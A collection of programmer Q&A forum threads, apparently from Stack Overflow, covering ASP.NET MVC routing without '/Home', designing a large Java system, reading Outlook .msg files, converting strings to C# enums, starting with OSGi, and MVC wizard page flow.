"How do I get rid of Home in ASP.Net MVC? <p>I know this site is written using ASP.Net MVC and I do not see ""/Home"" in the url.  This proves to me that it can be done.  What special route and do I need?</p>
 <p>Just change ""Home"" to an empty string.</p>

<pre><code>routes.MapRoute(
    ""Home"",
    """",
    new { action = Index, controller = Home }
);
</code></pre>
 <p>If you're running on IIS 7, you can simply delete the Default.aspx file that comes with ASP.NET MVC (assuming you're running on Preview 3 or higher). That file was needed due to an issue with Cassini that was fixed in .NET 3.5 SP1. For more details check out:</p>

<p><a href=""http://haacked.com/archive/2008/04/10/upcoming-changes-in-routing.aspx"">http://haacked.com/archive/2008/04/10/upcoming-changes-in-routing.aspx</a>
and
<a href=""http://haacked.com/archive/2008/05/12/sp1-beta-and-its-effect-on-mvc.aspx"">http://haacked.com/archive/2008/05/12/sp1-beta-and-its-effect-on-mvc.aspx</a></p>
 <p>I actually like having all of my home controller methods to be at the root of the site. Like this:  /about, /contact, etc.  I guess I'm picky.  I use a simple route constraint to do it.  <a href=""http://sonerdy.com/getting-rid-of-home-in-aspnet-mvc"" rel=""nofollow"">Here is my blog post with a code sample.</a></p>
 <p>In IIS 7, you can simply delete the Default.aspx file that comes with ASP.NET MVC (assuming you're running on Preview 3 or higher). That file was needed due to an issue with Cassini that was fixed in .NET 3.5 SP1.</p>

<p>For more details check out:</p>

<p><a href=""http://haacked.com/archive/2008/04/10/upcoming-changes-in-routing.aspx"" rel=""nofollow"">Upcoming Changes In Routing</a>  and  <a href=""http://haacked.com/archive/2008/05/12/sp1-beta-and-its-effect-on-mvc.aspx"" rel=""nofollow"">.NET 3.5 SP1 Beta and Its Effect on MVC</a></p>
 <p>I'd add  </p>

<pre><code>routes.MapRoute(""NoIndex"", ""{action}"", new { controller = ""Home"", action = ""Index"" });
</code></pre>

<p>in RouteConfig.cs</p>
 <p>This is what I did to get rid of Home.  It will treat all routes with only one specifier as Home/Action and any with two as Controller/Action.  The downside is now controller has to have an explicit index (/Controller != /Controller/Index), but it might help you or others.</p>

<pre><code>routes.MapRoute(
    ""Default"",
    ""{action}"",
    new { controller = ""Home"", action = ""Index"" }
);

routes.MapRoute(
    ""Actions"",
    ""{controller}/{action}"",
    new { }
);
</code></pre>
"
"How do you begin designing a large system? <p>It's been mentioned to me that I'll be the sole developer behind a large new system.  Among other things I'll be designing a UI and database schema.</p>

<p>I'm sure I'll receive some guidance, but I'd like to be able to knock their socks off.  What can I do in the meantime to prepare, and what will I need to keep in mind when I sit down at my computer with the spec?</p>

<p>A few things to keep in mind: I'm a college student at my first real programming job.  I'll be using Java.  We already have SCM set up with automated testing, etc...so tools are not an issue.</p>
 <p>Before you start coding, plan out your database schema - everything else will flow from that. Getting the database reasonably correct early on will save you time and headaches later.</p>
 <p>Do you know much about OOP?  If so, look into Spring and Hibernate to keep your implementation clean and <a href=""http://codebetter.com/blogs/jeremy.miller/archive/2007/01/08/Orthogonal-Code.aspx"">orthogonal</a>.  If you get that, you should find TDD a good way to keep your design compact and lean, especially since you have ""automated testing"" up and running.</p>

<p>UPDATE:
Looking at the first slew of answers, I couldn't disagree more.  Particularly in the Java space, you should find plenty of mentors/resources on working out your application with Objects, <strong>not a database-centric approach</strong>.  Database design is typically the first step for Microsoft folks (which I do daily, but am in a recovery program, er, Alt.Net).  If you keep the focus on what you need to deliver to a customer and let your ORM figure out how to persist your objects, your design should be better.</p>
 <p>I do it the other way around. I find that doing it database-schema-first gets the system stuck in a data-driven-design that is difficult to abstract from persistence. We try to do domain model designs first <em>and then</em> base the database schema on those.</p>

<p>And then there's the infrastructure design: the team should settle on conventions on how to structure the program first and foremost. And then we work together to agree first on a design for the common functionality of the system (e.g., things everyone needs like persistence, logging, etc.). This becomes the framework of the system.</p>

<p>We all work on that together first before we split the rest of the functionalities amongst ourselves.</p>
 <p>The main thing is being able to abstract the complexity of the system so that you don't get bogged down by it as soon as you start off.</p>

<ul>
<li><p>First read the spec like a story (skimming through it). Don't stop at every requirement to analyze it right there and then. This will allow you to get an overall picture of the system without too many details. At this point you would start identifying the major functional components of the system. Start putting these down (use a mindmap tool if you like).</p></li>
<li><p>Then take each component and start exploding it (and tying each detail with requirements in the spec document). Do this for all components, till you have covered all requirements.</p></li>
<li><p>Now, you should start looking at relationships between the components, and whether there are repetitions of features or functions across the various components (which you can then pull out to create utility components, or such). Around now, you would have a good detailed map of your requirements in your mind.</p></li>
<li><p>NOW, you should think of designing the database, ER diagrams, Class Design, DFDs, deployment, etc.</p></li>
</ul>

<p>The problem with doing the last step first is that you can get bogged down in the complexity of your system without really gaining an overall understanding in the first place.</p>
 <p>I also disagree about starting with the database.  The DB is simply an artifact of how your business objects are persisted.  I don't know of an equivalent in Java, but .Net has stellar tools such as <a href=""http://subsonicproject.com/"" rel=""nofollow"">SubSonic</a> that allow your DB design to stay fluid as you iterate through your business objects design.  I'd say first and foremost (even before deciding on what technologies to introduce) focus on the process and identify your nouns and verbs ... then build out from those abstractions.  Hey, it really does work in the ""real world"", just like OOP 101 taught you!</p>
 <p>This sounds very much like my first job. Straight out of university, I was asked to design the database and business logic layer, while other people would take care of the UI. Meanwhile the boss was looking over my shoulder, unwilling to let go of what used to be his baby and was now mine, and poking his finger in it. Three years later, developers were fleeing the company and we were still X months away from actually selling anything.</p>

<p>The big mistake was in being too ambitious. If this is your first job, you <em>will</em> make mistakes and you <em>will</em> need to change how things work long after you've written them. We had all sorts of features that made the system more complicated than it needed to be, both on the database level and in the API that it presented to other developers. In the end, the whole thing was just far too complicated to support all at once and just died.</p>

<p>So my advice:</p>

<ol>
<li><p>If you're not sure about taking on such a big job single-handed, don't. Tell your employers, and get them to find or hire somebody for you to work with who can help you out. If people need to be added to the project, then it should be done near the start rather than after stuff starts going wrong.</p></li>
<li><p>Think very carefully about what the product is for, and to boil it down to the <strong>simplest</strong> set of requirements you can think of. If the people giving you the spec aren't technical, try to see past what they've written to what will actually work and make money. Talk to customers and salespeople, and understand the market.</p></li>
<li><p>There's no shame in admitting you're wrong. If it turns out that the entire system needs to be rewritten, because you made some mistake in your first version, then it's better to admit this as soon as possible so you can get to it. Correspondingly, don't try to make an architecture that can anticipate every possible contingency in your first version, because you don't know what every contingency is and will just get it wrong. Write once with an eye to throwing away and starting again - you may not have to, the first version may be fine, but admit it if you do.</p></li>
</ol>
 <p>Split the big system to smaller pieces.
And don't think that it's so complex, because it usually isn't. By thinking too complex it just ruins your thoughts and eventually the design. Some point you just realize that you could do the same thing easier, and then you redesign it.</p>

<p>Atleast this has been my major mistake in designing.</p>

<p>Keep it simple!</p>
 <p>It has been my experience that Java applications (.NET also) that consider the database last are highly likely to perform poorly when placed into a corporate environment.  You need to really think about your audience.  You didn't say if it was a web app or not.  Either way the infrastructure that you are implementing on is important when considering how you handle your data.</p>

<p>No matter what methodology you consider, how you get and save your data and it's impact on performance should be right up there as one of your #1 priorities.</p>
 <p>I found very insightful ideas about starting a new large project, based on</p>

<ul>
<li>common good practices</li>
<li>Test Driven Development</li>
<li>and pragmatic approach  </li>
</ul>

<p>in the book <a href=""http://www.mockobjects.com/2008/07/growing-object-oriented-software-guided.html"" rel=""nofollow"">Growing Object-Oriented Software, Guided by Tests</a>.</p>

<p>It is still under development, but first 3 chapters may be what You are looking for and IMHO worth reading. </p>
 <p>I'd suggest thinking about how this application will be used. How will future users work with it? I'm sure you know at least a few things about what this application needs to handle, but my first advice is ""think of the user and what he or she needs"".</p>

<p>Draw it up on plain paper, thinking of where to section off the code. Remeber not to mix logic with GUI code (common error). This way you will be set to extend your applications reach in the future to servlets and/or applets or whatever platform comes along. Section in layers so that you can respond to large changes faster without rebuilding everything. Layers should not see any other layers than their closest neighbouring layers.</p>

<p>Begin with true core functionallity. All that time consuming fluff (that will make your project 4 weeks late), wont matter much to the wast majority of users. It can be added later once you are sure you can deliver on time.</p>

<p>Btw. Even though this has nothing to do with design I'd just like to say that you won't deliver on time. Make a realistic estimate on time consumption and then double it :-) I assume here that you will not be alone in this project and that people will come and go as the project progresses. You may need to train people midway through the project, people go on holiday / need surgery etc. </p>
"
"Read from .msg files <p>I need to read from Outlook .MSG file in .NET <em>without</em> using COM API for Outlook (cos it will not be installed on the machines that my app will run). Are there any free 3rd party libraries to do that? I want to extract From, To, CC and BCC fields. Sent/Receive date fields would be good if they are also stored in MSG files.</p>
 <p>If you open the .MSG file in a text editor, i believe you will find that the information you are after is stored as plain text inside the file. (It is on all the messages i have checked at least)</p>

<p>It would be pretty easy to write some code to parse the file looking for lines beginning with ""From:"" or ""To:"" etc. and then extracting the information you need.</p>

<p>If you need the body of the email as well, that may be a bit more complicated.</p>
 <p>Microsoft has documented this: <a href=""http://msdn.microsoft.com/en-us/library/cc463912.aspx"" rel=""nofollow"">.MSG File Format Specification</a></p>
 <p><strong>Update:</strong> I have found a 3rd party COM library called <a href=""http://www.dimastr.com/redemption/"">Outlook Redemption</a> which is working fine for me at the moment. If you use it via COM-Interop in .NET, don't forget to release every COM object after you are done with it, otherwise your application crashes randomly.</p>
 <p>It's a ""Structured Storage"" document. I've successfully used <a href=""http://www.codeproject.com/KB/files/structstor.aspx"" rel=""nofollow"">Andrew Peace's code</a> to read these in the past, even under .NET (using C++/CLI) - it's clean and fairly easy to understand. Basically, you need to figure out which records you need, and query for those - it gets a little bit hairy, since different versions of Outlook and different types of messages will result in different records... </p>
 <p>There is code avaliable on CodeProject for reading .msg files without COM. See <a href=""http://www.codeproject.com/KB/office/reading%5Fan%5Foutlook%5Fmsg.aspx"">here</a>.</p>
 <p>Here's some sample VBA code using <a href=""http://www.dimastr.com/redemption"" rel=""nofollow"">Outlook Redemption</a> that Huseyint found.</p>

<pre><code>Public Sub ProcessMail()

   Dim Sess As RDOSession
   Dim myMsg As RDOMail
   Dim myString As String

   Set Sess = CreateObject(""Redemption.RDOSession"")
   Set myMsg = Sess.GetMessageFromMsgFile(""C:\TestHarness\kmail.msg"")

   myString = myMsg.Body
   myMsg.Body = Replace(myString, ""8750"", ""XXXX"")

   myMsg.Save

End Sub
</code></pre>
 <p>You can try our (commercial) <a href=""http://www.rebex.net/secure-mail.net/"" rel=""nofollow"">Rebex Secure Mail</a> library. It can read Outlooks MSG format. Following code shows how:</p>

<pre><code>// Load message
MailMessage message = new MailMessage();
message.Load(@""c:\Temp\t\message.msg"");

// show From, To and Sent date
Console.WriteLine(""From: {0}"", message.From);
Console.WriteLine(""To: {0}"", message.To);
Console.WriteLine(""Sent: {0}"", message.Date.LocalTime);

// find and try to parse the first 'Received' header
MailDateTime receivedDate = null;
string received = message.Headers.GetRaw(""Received"");
if (received != null)
{
    int lastSemicolon = received.LastIndexOf(';');
    if (lastSemicolon &gt;= 0)
    {
        string rawDate = received.Substring(lastSemicolon + 1);
        MimeHeader header = new MimeHeader(""Date"", rawDate);
        receivedDate = header.Value as MailDateTime;
    }
}

// display the received date if available
if (receivedDate != null)
    Console.WriteLine(""Received: {0}"", receivedDate.LocalTime);
</code></pre>

<p>More info on Sent and Received dates and how are they represented in the message can be found at <a href=""http://forum.rebex.net/questions/816/extract-senttime-receivetime-and-time-zones"" rel=""nofollow"">http://forum.rebex.net/questions/816/extract-senttime-receivetime-and-time-zones</a></p>
"
"How do I convert a string to an enum in C#? <p>What's the best way to convert a string to an enumeration value in C#?</p>

<p>I have an HTML select tag containing the values of an enumeration. When the page is posted, I want to pick up the value (which will be in the form of a string) and convert it to the enumeration value.</p>

<p>In an ideal world, I could do something like this:</p>

<pre><code>StatusEnum MyStatus = StatusEnum.Parse(""Active"");
</code></pre>

<p>but that isn't valid code.</p>
 <p>You're looking for <a href=""https://msdn.microsoft.com/en-us/library/aa328348.aspx"">Enum.Parse</a>.</p>

<pre><code>SomeEnum enum = (SomeEnum)Enum.Parse(typeof(SomeEnum), ""EnumValue"");
</code></pre>
 <p>It's rather ugly:</p>

<pre><code>StatusEnum MyStatus = (StatusEnum) Enum.Parse(typeof(StatusEnum), ""Active"", true);
</code></pre>

<p>I tend to simplify this with:</p>

<pre><code>public static T ParseEnum&lt;T&gt;(string value)
{
    return (T) Enum.Parse(typeof(T), value, true);
}
</code></pre>

<p>Then I can do:</p>

<pre><code>StatusEnum MyStatus = EnumUtil.ParseEnum&lt;StatusEnum&gt;(""Active"");
</code></pre>

<p>One option suggested in the comments is to add an extension, which is simple enough:</p>

<pre><code>public static T ToEnum&lt;T&gt;(this string value)
{
    return (T) Enum.Parse(typeof(T), value, true);
}

StatusEnum MyStatus = ""Active"".ToEnum&lt;StatusEnum&gt;();
</code></pre>

<p>Finally, you may want to have a default enum to use if the string cannot be parsed:</p>

<pre><code>public static T ToEnum&lt;T&gt;(this string value, T defaultValue) 
{
    if (string.IsNullOrEmpty(value))
    {
        return defaultValue;
    }

    T result;
    return Enum.TryParse&lt;T&gt;(value, true, out result) ? result : defaultValue;
}
</code></pre>

<p>Which makes this the call:</p>

<pre><code>StatusEnum MyStatus = ""Active"".ToEnum(StatusEnum.None);
</code></pre>

<p>However, I would be careful adding an extension method like this to <code>string</code> as (without namespace control) it will appear on all instances of <code>string</code> whether they hold an enum or not (so <code>1234.ToString().ToEnum(StatusEnum.None)</code> would be valid but nonsensical) . It's often be best to avoid cluttering Microsoft's core classes with extra methods that only apply in very specific contexts unless your entire development team has a very good understanding of what those extensions do. </p>
 <p><a href=""https://msdn.microsoft.com/en-us/library/aa328348.aspx"" rel=""nofollow"">Enum.Parse</a> is your friend:</p>

<pre><code>StatusEnum MyStatus = (StatusEnum)Enum.Parse(typeof(StatusEnum), ""Active"");
</code></pre>
 <pre><code>object Enum.Parse(System.Type enumType, string value, bool ignoreCase);
</code></pre>

<p>So if you had an enum named mood it would look like this:</p>

<pre><code>   enum Mood
   {
      Angry,
      Happy,
      Sad
   } 

   // ...
   Mood m = (Mood) Enum.Parse(typeof(Mood), ""Happy"", true);
   Console.WriteLine(""My mood is: {0}"", m.ToString());</code></pre>
 <pre><code>// str.ToEnum&lt;EnumType&gt;()
T static ToEnum&lt;T&gt;(this string str) 
{ 
    return (T) Enum.Parse(typeof(T), str);
}
</code></pre>
 <p>Note that the performance of Enum.Parse() is awful, because it is implemented via reflection. (The same is true of Enum.ToString, which goes the other way.) </p>

<p>If you need to convert strings to Enums in performance-sensitive code, your best bet is to create a <code>Dictionary&lt;String,YourEnum&gt;</code> at startup and use that to do your conversions. </p>
 <p>We couldn't assume perfectly valid input, and went with this variation of @Keith's answer:</p>

<pre><code>public static TEnum ParseEnum&lt;TEnum&gt;(string value) where TEnum : struct
{
    TEnum tmp; 
    if (!Enum.TryParse&lt;TEnum&gt;(value, true, out tmp))
    {
        tmp = new TEnum();
    }
    return tmp;
}
</code></pre>
 <p>Parses string to TEnum without try/catch and without TryParse() method from .NET 4.5</p>

<pre><code>/// &lt;summary&gt;
/// Parses string to TEnum without try/catch and .NET 4.5 TryParse()
/// &lt;/summary&gt;
public static bool TryParseToEnum&lt;TEnum&gt;(string probablyEnumAsString_, out TEnum enumValue_) where TEnum : struct
{
    enumValue_ = (TEnum)Enum.GetValues(typeof(TEnum)).GetValue(0);
    if(!Enum.IsDefined(typeof(TEnum), probablyEnumAsString_))
        return false;

    enumValue_ = (TEnum) Enum.Parse(typeof(TEnum), probablyEnumAsString_);
    return true;
}
</code></pre>
 <p>Use <a href=""http://msdn.microsoft.com/query/dev12.query?appId=Dev12IDEF1&amp;l=EN-US&amp;k=k%28System.Enum.TryParse%60%601%29;k%28SolutionItemsProject%29;k%28TargetFrameworkMoniker-.NETFramework,Version=v4.5%29;k%28DevLang-csharp%29&amp;rd=true"">Enum.TryParse()</a> (>= .NET 4.0):</p>

<pre><code>StatusEnum myStatus;
Enum.TryParse(""Active"", out myStatus);
</code></pre>
 <p>You can use <a href=""https://en.wikipedia.org/wiki/Extension_method#Extension_methods"" rel=""nofollow"">extension methods</a> now:</p>

<pre><code>public static T ToEnum&lt;T&gt;(this string value, bool ignoreCase = true)
{
    return (T) Enum.Parse(typeof (T), value, ignoreCase);
}
</code></pre>

<p>And you can call them by the below code (here, <code>FilterType</code> is an enum type):</p>

<pre><code>FilterType filterType = type.ToEnum&lt;FilterType&gt;();
</code></pre>
 <p>You can extend the accepted answer with a default value to avoid exceptions:</p>

<pre><code>public static T ParseEnum&lt;T&gt;(string value, T defaultValue) where T : struct
{
    try
    {
        T enumValue;
        if (!Enum.TryParse(value, true, out enumValue))
        {
            return defaultValue;
        }
        return enumValue;
    }
    catch (Exception)
    {
        return defaultValue;
    }
}
</code></pre>

<p>Then you call it like:</p>

<pre><code>StatusEnum MyStatus = EnumUtil.ParseEnum(""Active"", StatusEnum.None);
</code></pre>
 <p>I used class (strongly-typed version of Enum with parsing and performance improvements). I found it on GitHub, and it should work for .NET 3.5 too. It has some memory overhead since it buffers a dictionary.</p>

<pre><code>StatusEnum MyStatus = Enum&lt;StatusEnum&gt;.Parse(""Active"");
</code></pre>

<p>The blogpost is <em><a href=""http://damieng.com/blog/2010/10/17/enums-better-syntax-improved-performance-and-tryparse-in-net-3-5"" rel=""nofollow"">Enums – Better syntax, improved performance and TryParse in NET 3.5</a></em>.</p>

<p>And code:
<a href=""https://github.com/damieng/DamienGKit/blob/master/CSharp/DamienG.Library/System/EnumT.cs"" rel=""nofollow"">https://github.com/damieng/DamienGKit/blob/master/CSharp/DamienG.Library/System/EnumT.cs</a></p>
 <pre><code>public static T ParseEnum&lt;T&gt;(string value)            //function declaration  
{
    return (T) Enum.Parse(typeof(T), value);
}

Importance imp = EnumUtil.ParseEnum&lt;Importance&gt;(""Active"");   //function call
</code></pre>

<p>====================A Complete Program====================</p>

<pre><code>using System;

class Program
{
    enum PetType
    {
    None,
    Cat = 1,
    Dog = 2
    }

    static void Main()
    {

    // Possible user input:
    string value = ""Dog"";

    // Try to convert the string to an enum:
    PetType pet = (PetType)Enum.Parse(typeof(PetType), value);

    // See if the conversion succeeded:
    if (pet == PetType.Dog)
    {
        Console.WriteLine(""Equals dog."");
    }
    }
}
-------------
Output

Equals dog.
</code></pre>
 <p>I like the extension method solution..</p>

<pre><code>namespace System
{
    public static class StringExtensions
    {

        public static bool TryParseAsEnum&lt;T&gt;(this string value, out T output) where T : struct
        {
            T result;

            var isEnum = Enum.TryParse(value, out result);

            output = isEnum ? result : default(T);

            return isEnum;
        }
    }
}
</code></pre>

<p>Here below my implementation with tests.</p>

<pre><code>using static Microsoft.VisualStudio.TestTools.UnitTesting.Assert;
using static System.Console;

private enum Countries
    {
        NorthAmerica,
        Europe,
        Rusia,
        Brasil,
        China,
        Asia,
        Australia
    }

   [TestMethod]
        public void StringExtensions_On_TryParseAsEnum()
        {
            var countryName = ""Rusia"";

            Countries country;
            var isCountry = countryName.TryParseAsEnum(out country);

            WriteLine(country);

            IsTrue(isCountry);
            AreEqual(Countries.Rusia, country);

            countryName = ""Don't exist"";

            isCountry = countryName.TryParseAsEnum(out country);

            WriteLine(country);

            IsFalse(isCountry);
            AreEqual(Countries.NorthAmerica, country); // the 1rst one in the enumeration
        }
</code></pre>
 <p><strong>BEWARE:</strong></p>

<pre><code>enum Example
{
    One = 1,
    Two = 2,
    Three = 3
}
</code></pre>

<p><code>Enum.(Try)Parse()</code> <strong>accepts multiple, comma-separated arguments, and combines them with binary 'or' <code>|</code></strong>. You cannot disable this and in my opinion you almost never want it.</p>

<pre><code>var x = Enum.Parse(""One,Two""); // x is now Three
</code></pre>

<p>Even if <code>Three</code> was not defined, <code>x</code> would still get int value <code>3</code>. That's even worse: Enum.Parse() can give you a value that is not even defined for the enum!</p>

<p>I would not want to experience the consequences of users, willingly or unwillingly, triggering this behavior.</p>

<p>Additionally, as mentioned by others, performance is less than ideal for large enums, namely linear in the number of possible values.</p>

<p>I suggest the following:</p>

<pre><code>    public static bool TryParse&lt;T&gt;(string value, out T result)
        where T : struct
    {
        var cacheKey = ""Enum_"" + typeof(T).FullName;

        // [Use MemoryCache to retrieve or create&amp;store a dictionary for this enum, permanently or temporarily.
        // [Implementation off-topic.]
        var enumDictionary = CacheHelper.GetCacheItem(cacheKey, CreateEnumDictionary&lt;T&gt;, EnumCacheExpiration);

        return enumDictionary.TryGetValue(value.Trim(), out result);
    }

    private static Dictionary&lt;string, T&gt; CreateEnumDictionary&lt;T&gt;()
    {
        return Enum.GetValues(typeof(T))
            .Cast&lt;T&gt;()
            .ToDictionary(value =&gt; value.ToString(), value =&gt; value, StringComparer.OrdinalIgnoreCase);
    }
</code></pre>
 <p>For performance this might help:</p>

<pre><code>    private static Dictionary&lt;Type, Dictionary&lt;string, object&gt;&gt; dicEnum = new Dictionary&lt;Type, Dictionary&lt;string, object&gt;&gt;();
    public static T ToEnum&lt;T&gt;(this string value, T defaultValue)
    {
        var t = typeof(T);
        Dictionary&lt;string, object&gt; dic;
        if (!dicEnum.ContainsKey(t))
        {
            dic = new Dictionary&lt;string, object&gt;();
            dicEnum.Add(t, dic);
            foreach (var en in Enum.GetValues(t))
                dic.Add(en.ToString(), en);
        }
        else
            dic = dicEnum[t];
        if (!dic.ContainsKey(value))
            return defaultValue;
        else
            return (T)dic[value];
    }
</code></pre>
 <p>I found that here the case with enum values that have EnumMember value was not considered. So here we go:</p>

<pre><code>using System.Runtime.Serialization;

public static TEnum ToEnum&lt;TEnum&gt;(this string value, TEnum defaultValue) where TEnum : struct
{
    if (string.IsNullOrEmpty(value))
    {
        return defaultValue;
    }

    TEnum result;
    var enumType = typeof(TEnum);
    foreach (var enumName in Enum.GetNames(enumType))
    {
        var fieldInfo = enumType.GetField(enumName);
        var enumMemberAttribute = ((EnumMemberAttribute[]) fieldInfo.GetCustomAttributes(typeof(EnumMemberAttribute), true)).FirstOrDefault();
        if (enumMemberAttribute?.Value == value)
        {
            return Enum.TryParse(enumName, true, out result) ? result : defaultValue;
        }
    }

    return Enum.TryParse(value, true, out result) ? result : defaultValue;
}
</code></pre>

<p>And example of that enum:</p>

<pre><code>public enum OracleInstanceStatus
{
    Unknown = -1,
    Started = 1,
    Mounted = 2,
    Open = 3,
    [EnumMember(Value = ""OPEN MIGRATE"")]
    OpenMigrate = 4
}
</code></pre>
"
"What's the best way to get started with OSGI? <p>What makes a module/service/bit of application functionality a particularly good candidate for an OSGi module? </p>

<p>I'm interested in using <a href=""http://en.wikipedia.org/wiki/OSGi"">OSGi</a> in my applications. We're a Java shop and we use Spring pretty extensively, so I'm leaning toward using <a href=""http://www.springframework.org/osgi"">Spring Dynamic Modules for OSGi(tm) Service Platforms</a>. I'm looking for a good way to incorporate a little bit of OSGi into an application as a trial. Has anyone here used this or a similar OSGi technology? Are there any pitfalls? </p>

<p>@Nicolas - Thanks, I've seen that one. It's a good tutorial, but I'm looking more for ideas on how to do my first ""real"" OSGi bundle, as opposed to a Hello World example.</p>

<p>@david - Thanks for the link! Ideally, with a greenfield app, I'd design the whole thing to be dynamic. What I'm looking for right now, though, is to introduce it in a small piece of an existing application. Assuming I can pick any piece of the app, what are some factors to consider that would make that piece better or worse as an OSGi guinea pig?</p>
 <p>I really like the <a href=""http://felix.apache.org/site/tutorials-examples-and-presentations.html"" rel=""nofollow"">Apache Felix tutorials</a>. However, I think in general leveraging OSGi in your application isn't one of those ""let's use this framework, because it's hype"" decision. It's more of a design question, but then everything that OSGi gives you in terms of design, you can have with vanilla Java as well.</p>

<p>As for the runtime, you cannot just add an existing application and make it OSGi enabled. It needs to be design to be dynamic. Spring DM makes it easy to hide that from you, but it's still there and you need to be aware of it.</p>
 <p>Well, since you can not have one part OSGi and one part non-OSGi you'll need to make your entire app OSGi. In its simplest form you make a single OSGi bundle out of your entire application. Clearly this is not a best practice but it can be useful to get a feel for deploying a bundle in an OSGi container (Equinox, Felix, Knoplerfish, etc).</p>

<p>To take it to the next level you'll want to start splitting your app into components, components should typically have a set of responsibilities that can be isolated from the rest of your application through a set of interfaces and class dependencies. Identifying these purely by hand can range from rather straightforward for a well designed highly cohesive but loosely coupled application to a nightmare for interlocked source code that you are not familiar with.</p>

<p>Some help can come from tools like <a href=""http://clarkware.com/software/JDepend.html"">JDepend</a> which can show you the coupling of Java packages against other packages/classes in your system. A package with low efferent coupling should be easier to extract into an OSGi bundle than one with high efferent coupling. Even more architectural insight can be had with pro tools like <a href=""http://www.headwaysoftware.com/products/structure101/index.php"">Structure 101</a>.</p>

<p>Purely on a technical level, working daily with an application that consists of 160 OSGi bundles and using Spring DM I can confirm that the transition from ""normal"" Spring to Spring DM is largely pain free. The extra namespace and the fact that you can (and should) isolate your OSGi specific Spring configuration in separate files makes it even easier to have both with and without OSGi deployment scenarios.</p>

<p>OSGi is a deep and wide component model, documentation I recommend:</p>

<ul>
<li><a href=""http://www.osgi.org/Release4/Download"">OSGi R4 Specification</a>: Get the PDFs of the Core and Compendium specification, they are canonical, authoritative and very readable. Have a shortcut to them handy at all times, you will consult them.</li>
<li>Read up on OSGi best practices, there is a large set of things you <strong>can</strong> do but a somewhat smaller set of things you <strong>should</strong> do and there are some things you should <strong>never do</strong> (DynamicImport: * for example). </li>
</ul>

<p>Some links: </p>

<ul>
<li><a href=""http://felix.apache.org/site/presentations.data/best-practices-apachecon-20060628.pdf"">OSGi best practices and using Apache Felix</a></li>
<li><a href=""http://www.osgi.org/wiki/uploads/CommunityEvent2007/OSGiBestPractices.pdf"">Peter Kriens and BJ Hargrave in a Sun presentation on OSGi best practices</a> </li>
<li>one key OSGi concept are Services, learn why and how they supplant the Listener pattern with the <a href=""http://www.osgi.org/wiki/uploads/Links/whiteboard.pdf"">Whiteboard pattern</a></li>
<li><strike><a href=""http://groups.google.com/group/spring-osgi"">The Spring DM Google Group</a> is very responsive and friendly in my experience</strike><br>
<a href=""http://groups.google.com/group/spring-osgi"">The Spring DM Google Group</a> is <a href=""https://groups.google.com/forum/#!topic/spring-osgi/e-3gVCgl-_M"">no longer active</a> and has moved to Eclipse.org as the Gemini Blueprint project which has a forum <a href=""http://www.eclipse.org/forums/index.php?t=thread&amp;frm_id=153"">here</a>.</li>
</ul>
 <p>Is your existing application monolithic or tiered in seperate processes/layers?</p>

<p>If tiered, you can convert the middle/app-tier to run in an OSGi container.</p>

<p>In my team's experience, we've found trying to do web-stuff in OSGi painful.  Other pain points are Hibernate and Jakarta Commons Logging.</p>

<p>I find the OSGi specs pretty readable and I recommend you print out the flowchart that shows the algorithm for class loading.  I'll guarantee you'll have moments of, ""why am I getting a NoClassDefFoundError?"": the flowchart will tell you why.</p>
 <p>There are a couple of thinks to keep in mind if you are starting with OSGi.</p>

<p>As mentioned elsewhere in this thread, knowing about classloading is really important. In my experience everybody sooner or later runs into problems with it.</p>

<p>Another important thing to remember is: never hold references! Have a look at the whiteboard pattern on which the services concept of OSGi is build (see the link in one of the other answers).</p>

<p>In my experience you should not try to convert a monolitic application into an OSGi-based one. This usually leads to a badly and unmanageable mess. Start anew.</p>

<p>Download one of the freely available stand-alone oSGi implementations. I found Knopflerfish rather good and stable (I use it in many projects). It also comes with lots of source code. You can find it here: <a href=""http://www.knopflerfish.org/index.html"" rel=""nofollow"">http://www.knopflerfish.org</a></p>

<p>Another good tutorial can be found here. <a href=""https://pro40.abac.com/deanhiller/cgi-bin/moin.cgi/OsgiTutorial"" rel=""nofollow"">https://pro40.abac.com/deanhiller/cgi-bin/moin.cgi/OsgiTutorial</a></p>

<p>Peter Kriens of the OSGi Alliance gave a nice interview: <a href=""http://www.infoq.com/interviews/osgi-peter-kriens"" rel=""nofollow"">http://www.infoq.com/interviews/osgi-peter-kriens</a>. His homepage and blog (which is always a good read can be found here: <a href=""http://www.aqute.biz"" rel=""nofollow"">http://www.aqute.biz</a></p>
 <p>Try <a href=""http://neilbartlett.name/blog/osgibook/"" rel=""nofollow"">http://neilbartlett.name/blog/osgibook/</a>. The book has hands on examples with OSGi best practices.</p>
 <p>When learning a new technology rich tooling gets you into things without big headaches.
At this point the community at <a href=""http://wiki.ops4j.org/confluence/x/Bg/"">ops4j.org</a> provides a rich toolset called ""PAX"" which includes:</p>

<ul>
<li><strong>Pax Runner</strong>: Run and switch between Felix, Equinox, Knopflerfish and Concierge easily</li>
<li><strong>Pax Construct</strong>: Construct, Organize &amp; Build OSGi projects with maven easily</li>
<li><strong>Pax Drone</strong>: Test your OSGi bundles with Junit while being framework independent (uses PaxRunner)</li>
</ul>

<p>Then there are many implementations of OSGi compendium services: </p>

<ul>
<li><strong>Pax Logging</strong> (logging), </li>
<li><strong>Pax Web</strong> (http service), </li>
<li><strong>Pax Web Extender</strong> (war support), </li>
<li><strong>Pax Coin</strong> (configuration), </li>
<li><strong>Pax Shell</strong> (shell implementation, part of the next osgi release) </li>
<li>and much more.</li>
</ul>

<p>.. and there is a helpful, framework independend community, - but thats now advertisement ;-) </p>
 <p>This answer comes nearly 3 years after the question was asked, but the <a href=""http://wso2.org/library/tutorials/develop-osgi-bundles-using-maven-bundle-plugin"" rel=""nofollow"">link</a> I just found is <strong>really good</strong>, especially for starters using maven. A step-by-step explanation.</p>
 <p>Try <a href=""http://njbartlett.name/files/osgibook_preview_20091217.pdf"" rel=""nofollow"">http://njbartlett.name/files/osgibook_preview_20091217.pdf</a> </p>

<p>OR </p>

<p><a href=""http://www.manning.com/hall/"" rel=""nofollow"">http://www.manning.com/hall/</a></p>

<p>The second is not a book i have read myself but I have heard good things about it. </p>

<p>The first was very useful for me. He takes you through the architecture initially and then it's hands on OSGi. </p>
"
"How do I handle page flow in MVC (particularly asp.net) <p>If you had to provide a wizard like form entry experience in mvc how would you abstract the page flow?</p>
 <p>There are a couple ways, create an action for each step of the wizard process, or create a parameter that is passed in to the action method.  Like <em>step</em> that will allow you to know what the state of the wizard is in.</p>
 <p>Investigate the post-redirect-get pattern.</p>

